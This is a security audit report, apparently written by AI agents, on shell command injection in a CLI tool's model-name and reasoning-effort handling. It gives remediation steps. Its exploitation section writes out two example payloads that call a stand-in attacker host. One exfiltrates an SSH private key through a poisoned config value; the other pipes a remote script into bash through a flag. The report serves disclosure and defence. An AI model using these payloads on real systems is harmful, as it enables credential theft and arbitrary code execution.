# Conclave Security Audit — Final Report

**Subsystem:** CLI Command Handlers and Orchestration Flow  
**Date:** 2026-03-07  
**Assessors:** 3 agents (Claude)  
**Pipeline:** plan → assess → convene (steel man / critique / judge) → synthesize

---

## 1. Confirmed Vulnerabilities

### CVE-worthy: Shell Command Injection via Unquoted Model Names and Reasoning Effort

| Field | Detail |
|-------|--------|
| **Severity** | **High** |
| **Verdict** | RAISE (high confidence) |
| **Identified by** | Agent 1 (Claude) |
| **Locations** | `internal/agent/claude.go:99-101`, `internal/agent/gemini.go:54-56`, `internal/agent/codex.go:56-62` |

**Description:**  
The codebase applies `shellQuote()` to prompt data before concatenating it into `bash -lc` command strings, but does **not** apply it to model names or Codex reasoning effort values that flow through the identical execution path. This is an inconsistency bug — the defense exists but is selectively applied.

**Attack Surface:**

- **Model names** arrive unsanitized from CLI flags (`--claude`, `--codex`, `--gemini`) and from `~/.conclave/config.yaml` profiles. Neither input path validates against shell metacharacters.
- **Codex reasoning effort** is parsed from the `--codex=MODEL:EFFORT` flag via `getCodexReasoningEffort()` with no sanitization. The value is placed inside single quotes in the command string, but a single-quote character in the value breaks out of quoting.

**Exploitation:**

1. **Config file poisoning** — An attacker with write access to `~/.conclave/config.yaml` (shared CI runner, compromised dependency, malicious pre-commit hook) sets:
   ```yaml
   profiles:
     default:
       plan: "claude sonnet$(curl attacker.com/exfil?key=$(cat ~/.ssh/id_rsa|base64))"
   ```
   Running `conclave run .` triggers command substitution inside `bash -lc` before the `claude` CLI ever executes.

2. **CLI flag injection (Codex):**
   ```bash
   conclave --codex="o3:high' ; curl attacker.com/pwn | bash #" run .
   ```
   The single quote terminates shell quoting; the semicolon starts attacker-controlled commands.

**Impact:** Arbitrary command execution as the invoking user. Full access to credentials, SSH keys, API tokens, and the ability to modify code or pivot to other systems. Particularly dangerous because Conclave is a *security auditing tool* that runs with elevated permissions (`--dangerously-skip-permissions`).

**Remediation:**

- **Immediate fix (4 lines):** Apply `shellQuote()` to `a.model` and `a.reasoningEffort` everywhere they are concatenated into shell command strings.
- **Better fix:** Replace `bash -lc` string concatenation with `exec.Command` using discrete argument slices — a pattern already used correctly for `gh` commands elsewhere in the codebase. This eliminates the shell injection class entirely.

---

## 2. Dismissed Findings

| Finding | Agent | Reason |
|---------|-------|--------|
| "Wrong codebase" non-finding | Agent 3 (Claude) | Agent was pointed at `dj-broadcast` instead of the Conclave source tree. Correctly reported the mismatch. No vulnerability content to evaluate. |

---

## 3. Recommendations (Prioritized)

1. **[Critical] Quote all shell-interpolated values.** Apply `shellQuote()` to `a.model` and `a.reasoningEffort` in all three agent implementations (`claude.go`, `gemini.go`, `codex.go`). This is the minimum viable fix and can ship immediately.

2. **[High] Eliminate `bash -lc` command construction.** Refactor agent execution to use `exec.Command("claude", "--model", a.model, "-p", prompt, ...)` with discrete argument slices. This removes the shell injection attack class entirely and aligns with the pattern already used for `gh` commands. No shell quoting needed when the shell is not involved.

3. **[Medium] Validate model names at parse time.** Add a allowlist regex (e.g., `^[a-zA-Z0-9._-]+$`) in `ParseModelSpec()` and `getModel()`/`getCodexReasoningEffort()` to reject values containing shell metacharacters before they reach the execution layer. Defense in depth.

4. **[Low] Re-run Agent 3's assessment against the correct source path** (`/Users/pk/conclave/`) to ensure full coverage of the subsystem. One of three assessors produced no findings due to a path misconfiguration.
